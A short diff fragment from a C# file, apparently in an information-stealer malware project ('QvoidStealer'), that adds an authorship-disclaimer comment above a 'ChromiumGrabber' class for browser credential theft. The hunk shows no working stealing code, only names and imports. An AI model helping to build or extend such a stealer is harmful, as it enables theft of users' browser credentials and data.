@@ -11,6 +11,8 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
+//I didn't write this implementation, if you are the owner of this code contact me for a credit.
+
 namespace QvoidStealer.Miscellaneous.Stealers.Browsers
 {
     public class ChromiumGrabber
